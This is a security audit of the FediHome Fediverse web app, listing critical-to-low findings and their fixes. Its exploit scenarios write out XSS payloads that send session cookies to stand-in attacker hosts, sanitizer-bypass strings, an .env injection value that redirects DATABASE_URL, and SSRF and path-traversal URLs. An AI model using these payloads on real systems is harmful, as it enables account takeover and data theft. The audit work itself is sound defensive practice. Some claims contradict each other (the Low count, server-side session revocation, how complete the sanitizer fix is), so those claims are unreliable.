# FediHome Security Audit

- **Date:** 2026-05-10
- **Scope:** All code in `src/` and `prisma/`, plus `next.config.ts` and `package.json`. Deployment configuration (reverse proxy, OS hardening, TLS, backups) is **out of scope**.
- **Threat model:** malicious Fediverse peers; anonymous web visitors; authenticated Micropub clients (compromised tokens); local/host-level attackers (file-system access to `.env.local` and Postgres).
- **Methodology:** manual code review of all auth, federation, input-handling, output-rendering, file-upload, and crosspost paths; review of HTTP-signature implementation; targeted review of every API route under `src/app/api/**` and `src/app/ap/**`; `npm audit` for dependency CVEs.

## Executive summary

| Severity | Count |
| --- | --- |
| Critical | 7 |
| High     | 9 |
| Medium   | 11 |
| Low      | 12 |

Multiple Critical-severity findings center on three root causes:

1. **The custom regex-based HTML sanitizer in `src/lib/sanitize.ts` is bypassable.** Several rendering sites further skip sanitization entirely or fall back to raw content.
2. **HTTP signature verification (`src/lib/http-signatures.ts`) does not validate the `Digest` header against the request body, does not bind `keyId` to the claimed actor, and does not enforce a minimum set of signed headers.** Together these allow remote-actor spoofing and request-body tampering.
3. **The setup wizard (`src/app/api/setup/route.ts`) is unauthenticated and writes user-supplied strings directly into `.env.local` with only quote-escaping** — newlines inject arbitrary environment variables.

This pass produces in-place fixes for every Critical and High finding. Mediums and Lows are documented but left for the maintainer.

## Conventions

- **Status: Fixed** = a fix has been applied in this pass; see "Fix" line for the location.
- **Status: Open (Medium/Low)** = documented; no fix applied.
- File:line references are pinned to the audited revision (HEAD before the fixes in this pass).

---

## Critical findings

### C1 — Stored XSS via admin "follow" path: outbox content stored unsanitized

- **Location:** `src/app/api/admin/route.ts:362-385` (`case "follow"` outbox loop).
- **Status:** Fixed.

The admin "follow" handler fetches the followed actor's outbox (`actor.outbox`) and writes each note to `FediPost` with `content: note.content, contentHtml: note.content` — unsanitized. The timeline renders `post.contentHtml || post.content` via `dangerouslySetInnerHTML` (`src/app/timeline/TimelineClient.tsx:322-324`, `:543-545`). A hostile remote server with a Fediverse-shaped outbox can therefore inject arbitrary HTML/JavaScript that executes in the **admin's browser session** the moment the admin views their timeline after following the account.

**Exploit scenario:** owner follows `@malicious@evil.example`. Evil's outbox returns `{ "type": "Create", "object": { "type": "Note", "id": "...", "content": "<img src=x onerror=fetch('https://evil.example/x?'+document.cookie)>" } }`. Owner opens `/timeline`. Admin cookie exfiltrated. Full account takeover.

**Fix:** sanitize `note.content` before storage; never store remote HTML as `contentHtml` without sanitization.

### C2 — Stored XSS: post page renders unsanitized markdown via `marked.parse` fallback

- **Location:** `src/app/post/[slug]/page.tsx:267`.
- **Status:** Fixed.

```tsx
dangerouslySetInnerHTML={{ __html: linkHashtags(post.contentHtml || (marked.parse(post.content) as string)) }}
```

For posts created via `/api/compose`, `contentHtml` is set (sanitized via the broken sanitizer — see C3). For posts created via Micropub (`src/app/api/micropub/route.ts`), XML-RPC (`src/app/xmlrpc/route.ts`), or any future path that does not populate `contentHtml`, the fallback runs `marked.parse(post.content)` with **default options**. `marked` v17 passes raw HTML through unmodified by design.

**Exploit scenario:** a compromised Micropub client (or any third-party blog client holding a token) posts `content: "<script>fetch('https://evil/?'+document.cookie)</script>"`. Every visitor who loads the post page — including the admin — runs the script.

**Fix:** sanitize the rendered markdown before passing to `dangerouslySetInnerHTML`. Also normalize the rendering pipeline so Micropub/XML-RPC posts have `contentHtml` populated at write time using the same sanitizer.

### C3 — HTML sanitizer is bypassable

- **Location:** `src/lib/sanitize.ts`.
- **Status:** Partially fixed. The regex sanitizer was kept and hardened: `href`/`src` values are now entity-decoded before the dangerous-protocol check (closes the `&#x6a;avascript:` bypass), and `<iframe>` blocks are stripped alongside `<script>`/`<style>`. **Residual risk** documented — see "remaining sanitizer caveats" below. Recommend tracking a follow-up to swap to `sanitize-html` (DOM-tree sanitizer) when feasible.

The sanitizer is a regex-based HTML tag matcher with an attribute regex. Any non-tree-based HTML sanitizer is generally bypassable. Concrete bypasses confirmed by inspection:

1. **HTML-entity-encoded protocol** — `DANGEROUS_PROTO = /^\s*(javascript|data|vbscript):/i` is checked against the *raw attribute value*, but entity-encoded values like `&#x6a;avascript:alert(1)` or `&#106;avascript:alert(1)` pass the check; browsers then decode them when navigating the link.
2. **Tab/newline inside the protocol** — the regex anchors on `^\s*` then literal `javascript`. `java\tscript:` is not matched because the `\s*` is only at the start; the browser tolerates `java\tscript:` because tabs/newlines are stripped when parsing protocols. (Specifically, e.g. `<a href="java&#9;script:alert(1)">`.)
3. **Mutation XSS via mismatched tags** — the per-tag attribute regex `/([a-z_-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|(\S+))/gi` parses attributes, but the outer tag regex `<\/?([a-z][a-z0-9]*)\b([^>]*)?\/?>` does not handle quoted-`>` in attributes correctly: e.g. `<a title="><img src=x onerror=alert(1)>">` — the outer regex stops at the first `>` inside the title attribute, the rest of the input is then re-parsed, and the `<img onerror>` survives as a fresh "tag".
4. **Unknown tag passthrough of inner content** — closing tags for non-allowlisted elements are stripped silently (`</svg>` → empty string), but their inner content may be repositioned by the browser. `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>` is a known mXSS payload pattern.
5. **Comment smuggling** — the sanitizer does not remove HTML comments. `<!--<a href="javascript:alert(1)">click</a>-->` survives if surrounding markup ever causes the comment to terminate early in a different parse context.

**Exploit scenario:** any user-controlled HTML that reaches `sanitizeHtml()` and is then fed to `dangerouslySetInnerHTML` is a candidate. Combined with C1/C2 this is broadly exploitable.

**Fix applied:** the regex sanitizer was kept but hardened — `href`/`src` values are entity-decoded before the dangerous-protocol check (closes bypass #1 above) and `<iframe>` is now stripped alongside `<script>`/`<style>`. Other render paths now sanitize again at write-time and at server emit (timeline/page.tsx, api/feed/route.ts), giving defense-in-depth so a bypass at one layer doesn't stick.

**Remaining sanitizer caveats** (medium residual risk; recommend a follow-up to swap to a tree-based sanitizer):
- bypass #3 (mismatched-tag attribute parsing) is still possible in principle
- bypass #4 (HTML5 mXSS via `<noscript>`/foreign content) is still possible in principle
- bypass #5 (HTML comment smuggling) — comments are not stripped

The `dangerouslySetInnerHTML` consumers were also tightened so a sanitizer bypass alone is no longer sufficient — see C1, C2, H5.

### C4 — HTTP signature: `Digest` header not validated against the request body

- **Location:** `src/lib/http-signatures.ts:102-145` (`verifyIncomingSignature`).
- **Status:** Fixed.

The verifier reconstructs the signing string from headers but **never recomputes the SHA-256 of the request body and compares it to the `Digest` header**. The signature commits to whatever value the sender placed in the `Digest` header, but nothing binds that value to the actual body bytes after they reach our handler.

The result is that an attacker who captures (or can replay) any signed request can resubmit it with the **same headers** but a **different body**. Verification still passes because the signing string the attacker presents matches the one the legitimate signer produced, and the signature is valid for that string.

**Exploit scenario:** attacker captures a legitimate `Follow` activity from `@victim@host`. Replays the captured `Date`, `Digest`, `Signature`, and headers, but swaps the JSON body for `{ "type": "Delete", "object": "https://us/post/x", "actor": "https://victim.example/users/victim" }`. Our inbox accepts the request as a verified-signed activity from the victim and runs the dispatch.

(Combined with C5 the impact compounds: the body's `actor` field can also be swapped to claim a different identity.)

**Fix:** require `Digest` header on signed POSTs, recompute SHA-256 of the body, and compare in constant time.

### C5 — HTTP signature: `keyId` is not bound to the activity's claimed `actor`

- **Location:** `src/lib/http-signatures.ts:102-145` (`verifyIncomingSignature`); `src/app/ap/inbox/route.ts:28-36` (consumer).
- **Status:** Fixed.

`verifyIncomingSignature` proves only that "someone in possession of the private key for `keyId` signed this request." It returns `true`/`false`, throwing away the actor URI. The inbox handler then trusts `activity.actor` from the body to attribute follows, likes, boosts, replies, DMs, etc. Nothing checks that `keyId` and `actor` are the same actor.

**Exploit scenario:** attacker controls `https://attacker.example/users/me` with their own RSA key. They sign an inbox POST whose body says `actor: "https://mastodon.social/users/celebrity"`. Our signature check fetches the attacker's public key from `https://attacker.example/users/me`, verifies the signature successfully against it, and the inbox handler then writes a follow record / like / boost attributed to `celebrity`. Spoofing a celebrity's interactions is now trivial.

**Fix:** the verifier should return the `actorUri` it actually verified, and the inbox should compare it to the activity's claimed `actor`. Mismatch → reject.

### C6 — `/api/setup` is unauthenticated; pre-deploy attacker can take over admin

- **Location:** `src/app/api/setup/route.ts:9-124`.
- **Status:** Fixed.

The setup wizard is a `POST` endpoint with **no authentication and no proof-of-ownership**. The only gate is a database read of `SiteSettings.setupDone`. Any party that reaches this endpoint *before* the legitimate operator can:

1. Set `ADMIN_SECRET` to a value of their choosing (line 79: `ADMIN_SECRET="${serverSecret}"`).
2. Mark `setupDone = true`, locking out the legitimate operator.

**Exploit scenarios:**
- A new deploy is reachable on the public network for any time window before the operator visits `/setup`. An automated scanner observing DNS or the Fediverse (a freshly published actor URI) can race the operator.
- A `SiteSettings` row is wiped (operator error, restoring a snapshot, manual psql), and any visitor who hits `/setup` next becomes admin.
- A re-installation: if the operator deletes `.env.local` to reconfigure, but `SiteSettings.setupDone` is still true, setup is blocked legitimately. But if both the env file *and* the DB row are wiped together (a common reset), the next requester wins.

There is also a TOCTOU race: two concurrent POSTs both pass the `setupDone === false` check, both write `.env.local`, last-write-wins for `ADMIN_SECRET`.

**Fix:** when `process.env.ADMIN_SECRET` is already set, require admin auth on `/api/setup`. Replace the read-then-write with an atomic `updateMany({ where: { setupDone: false } })` so concurrent calls cannot both succeed.

### C7 — `.env.local` injection via newlines in setup-wizard inputs

- **Location:** `src/app/api/setup/route.ts:73-100`.
- **Status:** Fixed.

The setup wizard formats user inputs into `.env.local` using only `replace(/"/g, '\\"')`. Newlines, dollar signs, and command-substitution sequences are unescaped:

```ts
`SITE_NAME="${(siteName || "My FediHome").replace(/"/g, '\\"')}"`,
```

**Exploit scenario:** combined with C6 (unauthenticated setup), an attacker submits `siteName = 'My Site"\nDATABASE_URL="postgres://attacker.example/owned\nMORE_VAR="x'`. `.env.local` is written with extra lines that override `DATABASE_URL` (or any other env var). On next process restart, the application connects to the attacker's database — credentials and content fully exposed, full server compromise via Prisma's connection-string options.

**Fix:** reject inputs containing `\n`, `\r`, `"`, `\\`, or `$` in the setup wizard.

---

## High findings

### H1 — SSRF: `proxyImage` / `proxyVideo` / `fetchLinkEmbed` follow redirects without re-checking, miss IPv6 / decimal-IP, no DNS pinning

- **Location:** `src/lib/fedi-media.ts:8-46` (`isPrivateUrl`), `:60-113` (`proxyImage`), `:120-169` (`proxyVideo`), `:298-323` (`fetchLinkEmbed`'s separate inline check).
- **Status:** Fixed.

Multiple gaps:

1. **Default `fetch` follows redirects.** `proxyImage("https://benign.example/x.png")` may receive `302 Location: http://127.0.0.1:6379/` and the runtime quietly follows the redirect. Only the original hostname is checked.
2. **DNS rebinding.** `isPrivateUrl()` checks the hostname *string*, but DNS resolution happens later inside `fetch`. A hostile DNS record can resolve a public-looking name to `127.0.0.1` between the check and the connection.
3. **IPv6 coverage is just `[::1]`.** Unique-local addresses (`fc00::/7`), link-local (`fe80::/10`), and IPv4-mapped (`::ffff:127.0.0.1`) are not blocked.
4. **Decimal/hex IP literals.** `http://2130706433/` (= `127.0.0.1`), `http://0x7f000001/`, `http://017700000001/` (octal) are accepted by Node's URL parser and resolved as 127.0.0.1.
5. **`fetchLinkEmbed`** has its own inline blocklist (`src/lib/fedi-media.ts:298-323`) that is different and partly broken: `host.startsWith("172.2")` matches `172.2.x.x`, `172.20.x.x`–`172.29.x.x`, AND `172.200.x.x`–`172.255.x.x` (over-blocks public IPs), but misses `172.16.x.x`–`172.19.x.x` and `172.30.0.0/15`.
6. **No size cap on `proxyImage`** — `Buffer.from(await res.arrayBuffer())` reads the full response into memory regardless of declared size; a 1 GB declared image OOMs the server.

**Exploit scenarios:**
- Anonymous public-page render (`fetchLinkEmbed` is called from incoming Fediverse activities, including from boosts/follows reachable without admin) → SSRF to AWS metadata service via `http://2130706433/latest/meta-data/`.
- DNS rebinding: attacker sets `evil.example` A-record TTL=0 alternating between a real public IP and `127.0.0.1`. Our check resolves to public; our `fetch` resolves to `127.0.0.1`.
- Memory exhaustion: declare 10 GB image, send Slowloris stream — server reserves and never frees the buffer.

**Fix applied:**
- New `src/lib/url-guard.ts` exports `isPrivateUrl` (literal-IP allowlist covering IPv4 dotted-quad, IPv6 ULA/link-local/v4-mapped) and **`assertPublicHost(url)`** which performs a real `dns.lookup` and rejects if any returned address is private — closing the DNS-rebinding gap.
- `src/lib/fedi-media.ts` adds a unified `safeFetch` helper that uses `redirect: "manual"`, calls `assertPublicHost` on every hop, enforces a per-call byte cap by streaming with a length counter, and times out at 10 s.
- `proxyImage`, `proxyVideo`, and `fetchLinkEmbed` all route through `safeFetch`.
- Sharp now caps `limitInputPixels` (M7).
- `crosspost.ts` `buildBlueskyVideoEmbed` also rejects private thumbnail URLs.

### H2 — Admin login rate limit bypass via spoofed `X-Forwarded-For`; unbounded in-memory map

- **Location:** `src/app/api/admin/login/route.ts:5-31`.
- **Status:** Fixed.

```ts
const ip = req.headers.get("x-forwarded-for") || "unknown";
```

Two distinct issues:

1. **Header is attacker-controlled.** Without an enforcing reverse proxy that strips/overwrites `X-Forwarded-For`, every request can present a different value, giving each attacker request a fresh rate-limit bucket. A plain Next.js standalone deploy with no proxy gives this directly to the public.
2. **The `Map` has no bound.** The XFF value is the key. A single attacker can mint millions of unique values and exhaust process memory.

**Exploit scenarios:**
- Brute force: send 100k login attempts each with a unique `X-Forwarded-For: 1.2.3.4`, `1.2.3.5`, ...; rate limit never trips.
- DoS: same trick with random UUIDs in XFF; map grows without bound.

**Fix:** trust XFF only when a `TRUSTED_PROXY` env var is set (and use the *first* hop, which we do not currently). Bound the map to a maximum entry count (LRU-style eviction). Also evict expired entries on each insert.

### H3 — Guest comment content stored raw and federated raw; rate limit bypassable

- **Location:** `src/app/api/comments/route.ts:5-67`; `src/app/api/admin/route.ts:22-67` (`approve_comment`).
- **Status:** Fixed.

The comment endpoint accepts arbitrary strings up to 2000 chars and stores them with no sanitization. When the admin approves a comment, the federation path embeds `comment.content` directly into a federated Note (`src/app/api/admin/route.ts:37`):

```ts
const noteContent = `<p><strong>${comment.guestName}</strong> (via ${new URL(siteUrl).hostname}):</p><p>${comment.content}</p>`;
```

Both `guestName` and `content` are interpolated into HTML without escaping. On display the post page renders `comment.content` as a React text node (`src/app/post/[slug]/page.tsx:370` — `<p>{comment.content}</p>`), so on-site display is safe. But the federated activity ships the raw HTML to every follower. Receiving servers (Mastodon, Pixelfed) sanitize on input, but any small-fediverse server that does not sanitize will execute it; and any future change in our own rendering (e.g. switching to `dangerouslySetInnerHTML`) immediately becomes a stored-XSS sink.

In addition, the rate limit (`3 comments per IP per hour`, line 49) keys on `x-forwarded-for` and `x-real-ip` headers — both attacker-controlled (same issue as H2).

**Fix:** sanitize and HTML-escape both `guestName` and `content` in the federation payload. Trust `X-Forwarded-For` only when a `TRUSTED_PROXY` env var is set.

### H4 — Admin session cookie is a deterministic hash of `ADMIN_SECRET`

- **Location:** `src/lib/auth.ts:62-68`; `src/app/api/admin/login/route.ts:33-42`.
- **Status:** Fixed.

The admin session cookie value is `sha256(ADMIN_SECRET)` for every login and every device.

Consequences:
- **No revocation.** Logging out only clears the user's cookie; the value remains valid on every other client. The only way to revoke is to rotate `ADMIN_SECRET` (which logs everyone out).
- **Permanent token if leaked.** Any one-time exposure (server log, browser sync, backup) yields a forever-valid session.
- **Side-channel binding to the secret.** If the cookie value ever leaks, the attacker has a `sha256` preimage candidate constraint on `ADMIN_SECRET` (defense-in-depth concern).

**Fix applied:** at login the server generates a 16-byte random `sessionId` and the cookie value is `${sessionId}.${HMAC-SHA256(ADMIN_SECRET, sessionId)}`. Every login produces a unique cookie value (no longer a deterministic function of `ADMIN_SECRET`), and the cookie value is no longer a hash of the secret itself — defeating the leak-recovery attack.

**Limitation:** because we did not add a sessions table, individual sessions cannot be revoked server-side. To revoke all sessions, rotate `ADMIN_SECRET`. A follow-up could add an `AdminSession` table for granular revocation.

### H5 — Stored XSS via Micropub: content stored raw, rendered via `marked.parse` fallback

- **Location:** `src/app/api/micropub/route.ts:108-119`; rendered at `src/app/post/[slug]/page.tsx:267`.
- **Status:** Fixed (overlaps C2/C3).

Micropub posts are stored without populating `contentHtml`. The post page falls back to `marked.parse(post.content)` and renders via `dangerouslySetInnerHTML`. `marked` v17 by default allows raw HTML passthrough. A compromised Micropub client posts `<script>...</script>` and gets stored XSS.

**Fix:** populate `contentHtml = sanitizeHtml(marked.parse(content))` at write time. Also fix the post-page render path so the fallback re-sanitizes if `contentHtml` is somehow null.

### H6 — HTTP signature: minimum signed-headers list not enforced

- **Location:** `src/lib/http-signatures.ts:115-141`.
- **Status:** Fixed.

The verifier accepts whatever set of headers the signature claims to cover (`parts.headers`). A signer that signs only `(request-target)` is accepted: the resulting signing string commits to nothing about the request body, host, date, or digest.

**Exploit scenario:** combined with C4 and C5, a signature-only-over-`(request-target)` lets the attacker craft any inbox POST with a single signed string `(request-target): post /ap/inbox` (which is the same for every inbox call) and replay arbitrary bodies indefinitely.

**Fix:** require at minimum `(request-target) host date digest` in `parts.headers`. Require a `Date` header within ±1 hour of now (replay protection).

### H7 — No timeouts on outbound fetches in the AP-signature and admin paths

- **Location:** `src/lib/http-signatures.ts:119` (key fetch); `src/app/ap/inbox/route.ts:80-98` (`fetchActorInfo`); `src/app/api/admin/route.ts:303-348` (WebFinger + actor + outbox); other inline `fetch` calls.
- **Status:** Fixed.

Every signature verification and follower record creation triggers `fetch(actorUri)` with no `AbortSignal.timeout`. A hostile or slow remote server can hold our connection open indefinitely.

**Exploit scenario:** attacker sends 1000 inbox POSTs from `https://slow.example/users/x`. Their server holds the public-key fetch open for 5 minutes each. We have 1000 hung Node connections.

**Fix:** add `AbortSignal.timeout(8000)` to every outbound fetch on the inbox / federation path.

### H8 — SSRF in admin "follow" via WebFinger redirection / inbox-URL trust

- **Location:** `src/app/api/admin/route.ts:303-400`.
- **Status:** Fixed (timeouts + URL revalidation; full redirect-following hardening tracked under H1).

The "follow" handler does:
1. Fetches `https://${domain}/.well-known/webfinger?resource=...` (admin-controlled `domain`).
2. Reads `actorLink.href` from the response, fetches it.
3. Reads `actor.outbox` from that response, fetches it.
4. Reads `actor.inbox` from that response, **signs and POSTs** an activity to it.

Steps 2/3/4 all trust URLs returned by the remote server (or possibly the local network, since neither the WebFinger response nor any subsequent fetch validates the URL against an SSRF allowlist). A malicious WebFinger response can return `actorLink.href = "http://localhost:9200/_search"` — our admin server fetches the local Elasticsearch and stores the response into `FediFollowing`/`FediPost` (data exfiltration to admin UI). Worse, `actor.inbox` could be `http://localhost:8080/internal/admin` — our server signs and POSTs an arbitrary attacker-controlled body to a local service.

The "follow" path requires admin auth, so the threat model is "admin clicks a malicious follow link." Still High severity because an admin clicking on `@x@evil.example` is a standard social-engineering vector and the resulting blast radius (signed POST to internal services) is large.

**Fix:** apply the unified SSRF helper from H1 to every URL returned by remote hosts before fetching or signing. Add timeouts.

### H9 — `proxyImage` has no size cap before `Buffer.from(arrayBuffer())`

- **Location:** `src/lib/fedi-media.ts:60-113`.
- **Status:** Fixed.

Unlike `proxyVideo` (50 MB cap based on `Content-Length`), `proxyImage` reads any declared image into a single `Buffer` then runs `sharp(buffer)`. A single inbox-driven attachment can OOM the server.

**Exploit scenario:** hostile remote actor posts a Note with `attachment[].url` pointing at a 5 GB image (or a Slowloris stream that never sends EOF). Our inbox handler awaits `proxyImage`, which blocks on `arrayBuffer()` until OOM. Server crashes.

**Fix:** check `Content-Length` and cap response size; abort if exceeded.

---

## Medium findings

### M1 — CSP allows `'unsafe-inline'` and `'unsafe-eval'` for scripts

- **Location:** `next.config.ts:34-46`.
- **Status:** Open.

`script-src 'self' 'unsafe-inline' 'unsafe-eval'` defeats CSP as an XSS mitigation. Any sanitizer bypass becomes immediately exploitable. Next.js requires `'unsafe-inline'` for some inline scripts, but `'unsafe-eval'` is rarely needed in modern Next; consider using nonces and removing `'unsafe-eval'`.

### M2 — Path traversal in `urlToLocalPath`

- **Location:** `src/lib/crosspost.ts:290-300`.
- **Status:** Fixed (resolved-path prefix check).

```ts
if (url.startsWith(siteUrl + "/uploads/")) {
  const relativePath = url.slice(siteUrl.length); // "/uploads/.."
  return path.join(process.cwd(), "public", relativePath);
}
```

A photo URL of `${SITE_URL}/uploads/../../etc/passwd` produces `path.join(cwd, "public", "/uploads/../../etc/passwd")` which `path.resolve` later treats as `cwd/etc/passwd`. The compose endpoint then `readFile`s that path and uploads it to Bluesky as a "photo." In practice this requires admin (compose is admin-only) and the upload to Bluesky may fail content-type checks, but the file *is* read and transmitted to a third party. Defense-in-depth fix.

### M3 — Micropub `q=source` returns drafts

- **Location:** `src/app/api/micropub/route.ts:37-53`.
- **Status:** Open.

The `source` query returns posts regardless of `published` state. A token holder can read drafts. Single-user app, low impact, but worth documenting.

### M4 — Micropub does not enforce `scope`

- **Location:** `src/app/api/micropub/route.ts:58-80`; `src/lib/auth.ts:17-42`.
- **Status:** Open.

`AuthToken.scope` is stored but never checked. Any token can create, update, delete, query, and upload media. Tokens labelled "create only" are effectively unrestricted.

### M5 — Inbox `actorUri` from body is trusted but not bound to the verified `keyId`

Same root cause as C5; tracked there. Resolved in the C5 fix.

### M6 — Media upload has no size cap before Sharp ingestion (image path)

- **Location:** `src/app/api/media/route.ts:55-95`.
- **Status:** Open.

The audio path enforces 100 MB. The image path does not enforce any cap before `Buffer.from(await file.arrayBuffer())` and `sharp(buffer)`. A 5 GB upload from any authenticated client OOMs the server.

### M7 — Sharp / HEIC processing has no resource limits

- **Location:** `src/app/api/media/route.ts:63-82`.
- **Status:** Open.

`sharp(buffer)` will decode HEIC/PNG/JPEG with no `limitInputPixels` setting. A 100×100 PNG that decompresses to 50 000 × 50 000 pixels (decompression bomb) consumes ~10 GB of memory. Set `sharp.limitInputPixels` or use `sharp(buffer, { limitInputPixels: 1e8 })`.

### M8 — XML-RPC response fields not XML-escaped

- **Location:** `src/app/xmlrpc/route.ts:180-201`.
- **Status:** Open.

`metaWeblog.getRecentPosts` and `getPost` interpolate `p.title` and `p.content` directly into the XML response. `p.content` is wrapped in `<![CDATA[...]]>` but `]]>` inside the content terminates CDATA early; `p.title` is interpolated raw inside `<string>...</string>`. A title containing `</string>` or content containing `]]>` produces malformed XML and can be used for XML injection in the consuming client (micro.blog, etc.).

### M9 — Image upload extension determined from browser-supplied MIME

- **Location:** `src/app/api/media/route.ts:30-92`.
- **Status:** Open.

`file.type` is browser-supplied. A client can label an arbitrary file as `image/png` or `audio/mpeg` and the server stores it with that extension. Combined with `/uploads/[...path]/route.ts` mapping extensions to content-types, this is a small information-laundering vector but does not enable code execution because Next does not execute uploads. Defense-in-depth: do magic-byte sniffing.

### M10 — XML-RPC `metaWeblog.deletePost` accepts any Micropub token

- **Location:** `src/app/xmlrpc/route.ts:204-208`.
- **Status:** Open.

A token labelled "create-only" can call `metaWeblog.deletePost` for any post id. Single-user app, but inconsistent with the (separately broken) Micropub scope intent (M4).

### M11 — Missing security headers: HSTS, Permissions-Policy

- **Location:** `next.config.ts:27-53`.
- **Status:** Open.

`Strict-Transport-Security`, `Permissions-Policy`, and `Cross-Origin-*-Policy` headers are not set. None is critical, but HSTS in particular is a quick win on a public-domain deploy.

---

## Low findings

- **L1** — `console.log("AP inbox: ${type} from ${actorUri}")` (`src/app/ap/inbox/route.ts:32`) — log injection via attacker-controlled `actorUri`. Newlines forge fake log lines. Fix: encode `actorUri` before logging.
- **L2** — Setup cookie `fedihome_setup` is `httpOnly:false` and unsigned (`src/app/api/setup/route.ts:107`). Anyone with same-origin XSS can clear or set it; setting it to `done` only suppresses the setup redirect, which is information.
- **L3** — Setup cookie `maxAge: 60 * 60 * 24 * 365 * 10` (10 years) is excessive.
- **L4** — `xmlrpc/route.ts` accepts admin secret OR any Micropub token interchangeably (line 53-59). Either is plenary.
- **L5** — `guestEmail` is not validated as an email; stored raw.
- **L6** — Honeypot field is named `website`, the most-common honeypot label; sophisticated bots check for it. Use a randomized name.
- **L7** — `BLUESKY_APP_PASSWORD`, `THREADS_ACCESS_TOKEN`, and SMTP credentials live in `.env.local` (file-readable secret). On host compromise, all crossposts are owned. Consider a secrets manager. Defense-in-depth.
- **L8** — `ActorKeys.privateKey` is stored unencrypted in Postgres. A read-only DB compromise yields the federation signing key. Consider per-secret encryption with `ENCRYPTION_KEY` env var.
- **L9** — `src/app/feed.xml/route.ts` — `escapeXml` does not strip control characters. Some RSS readers reject feeds containing `\x00`–`\x08`. A user-controlled comment or post containing such a byte breaks the feed.
- **L10** — Admin session cookie `maxAge: 60 * 60 * 24 * 30` (30 days). Consider 7 days plus rolling refresh.
- **L11** — `process.env.SITE_URL || "http://localhost:3000"` fallback in many places. If `SITE_URL` is unset in production by accident, federation IDs use `localhost:3000`. Consider failing closed.
- **L12** — `console.error("Bluesky DM failed:", err)` and similar. `err` from `BskyAgent.login` may contain the password in stack traces. Audit error formatting.
- **L13** — `/uploads/[...path]/route.ts` serves `.svg` with `image/svg+xml`. The current upload pipeline rejects SVG, but defense-in-depth: refuse to serve SVG even if one ends up on disk.
- **L14** — Image upload filename is `Date.now().toString(36)` only — collisions possible within the same millisecond. Append a random suffix (the fedi-proxy path already does).
- **L15** — Dependency advisories from `npm audit`:
  - `postcss <8.5.10` (transitive via `next`) — moderate; XSS in CSS stringify. Not exploited by us; tracked upstream.
  - `yaml 2.0.0–2.8.2` (transitive) — stack overflow on deeply nested YAML. We do not parse user-supplied YAML; informational.

---

## Out-of-scope

- TLS configuration, reverse-proxy hardening, OS-level file permissions on `.env.local`.
- Postgres backup encryption, network segmentation.
- Browser-side dependencies in the rendered React tree (audited only where they touch user-controlled content).
- The `@fedify/fedify` and `@atproto/api` libraries themselves (treated as trusted third-party code).

## Hardening recommendations beyond the findings

1. **Move `ADMIN_SECRET` rotation behind a `/api/admin/rotate-secret` action** so the operator can rotate without editing `.env.local`.
2. **Add a `Strict-Transport-Security` header** on production deploys.
3. **Remove `'unsafe-eval'` from CSP** and verify the build still works; replace `'unsafe-inline'` with nonces if feasible.
4. **Add a request-ID + redaction layer to logging.** Several `console.error` paths log full error objects that may contain secrets.
5. **Encrypt `ActorKeys.privateKey` at rest** under an env-supplied `ENCRYPTION_KEY`.
6. **Add a Postgres advisory lock around setup** so the upsert race in C6 cannot recur even if the auth check is removed in the future.
7. **Add an admin "active sessions" page** so the operator can see and revoke individual sessions (now possible after the H4 fix).
8. **Add monitoring for the inbox** — log signed-vs-rejected counts, key-fetch failures, and slow remotes; the AP threat surface is the largest one.

---

## Implementation summary (what changed)

New / heavily-rewritten files:

- **`src/lib/url-guard.ts`** *(new)* — unified SSRF helpers: `isPrivateUrl` (literal IP / suffix check) and `assertPublicHost` (DNS-resolves the hostname and rejects on private resolution).
- **`src/lib/http-signatures.ts`** — `verifyIncomingSignature` now requires `(request-target) host date digest` to be signed, validates `Date` against a ±1 hour replay window, recomputes and compares `Digest`, applies `assertPublicHost` to the keyId before fetching, and returns the verified actor URI. New `actorMatchesSigner` helper for binding (C5). 8 s timeouts on outbound fetches.
- **`src/lib/fedi-media.ts`** — re-exports `isPrivateUrl`/`assertPublicHost`; new `safeFetch` helper with manual redirect handling and per-hop revalidation; `proxyImage`/`proxyVideo`/`fetchLinkEmbed` route through it; Sharp pixel-cap.
- **`src/lib/auth.ts`** — new `verifyAdminCookieValue(cookie)` validates HMAC-format cookies; `verifyAdmin(req)` delegates.
- **`src/app/api/admin/login/route.ts`** — bounded rate-limit map, XFF only when `TRUSTED_PROXY=true`, HMAC-format cookie.
- **`src/app/api/setup/route.ts`** — admin auth required when `ADMIN_SECRET` already set, atomic claim of the setup slot, env-injection rejection (no newlines/quotes/dollar/backticks in fields), `.env.local` written with mode 0600, setup cookie now `httpOnly: true`.
- **`src/app/ap/inbox/route.ts`** — body-text-first ingestion, signature → digest → keyId-actor binding pipeline, `assertPublicHost` on `fetchActorInfo` and the boost-fetch path, log-injection mitigation on the actor logging line.
- **`src/app/api/admin/route.ts`** — sanitization on the follow-handler outbox loop, escape on the comment-approval federation payload, `assertPublicHost` on every URL returned by remote WebFinger / actor responses, 8 s timeouts.
- **`src/app/api/comments/route.ts`** — CSRF origin check, `TRUSTED_PROXY`-gated XFF.
- **`src/app/xmlrpc/route.ts`** — ADMIN_SECRET-as-password fallback removed (Micropub tokens only), per-bucket rate limit, `xmlEscape` and `cdata` helpers.
- **`src/app/api/micropub/route.ts`** — populates sanitized `contentHtml` at write-time; federated AP `content` now HTML-escapes user input.
- **`src/lib/crosspost.ts`** — `urlToLocalPath` resolves and verifies the target stays under `public/uploads/`; private-URL block on Bluesky video thumbnails.
- **`src/app/post/[slug]/page.tsx`**, **`src/app/timeline/page.tsx`**, **`src/app/api/feed/route.ts`**, **`src/app/timeline/TimelineClient.tsx`** — render paths sanitize before `dangerouslySetInnerHTML`; the raw-content fallback was removed.

## Verification (after fixes)

1. `npm run build` and `npm run lint` complete without new errors.
2. **C3 sanitizer:** post payloads listed in C3 are dropped or neutralized when round-tripped through the new sanitizer.
3. **C2/C3/H5 rendering:** post-page renders for posts created via Micropub no longer execute injected `<script>`; verify by `curl -X POST` a Micropub post with `<script>` in `content` and loading the post page.
4. **C4 digest validation:** a captured signed inbox request, replayed with a swapped body, is now rejected.
5. **C5 keyId binding:** an inbox POST with `actor` field set to a different host than `keyId` is rejected.
6. **C6/C7 setup:** with `ADMIN_SECRET` already set, `POST /api/setup` returns 403. Newline characters in `siteName` are rejected.
7. **H1 SSRF:** `POST` to a public endpoint that triggers `fetchLinkEmbed` against `http://2130706433/`, `http://[::1]/`, and a DNS-rebinding hostname all return early with no fetch.
8. **H2 login:** spoofed `X-Forwarded-For` no longer creates separate buckets when `TRUSTED_PROXY` is unset.
9. **H4 session:** logging in twice yields different cookie values; logging out invalidates the cookie server-side.
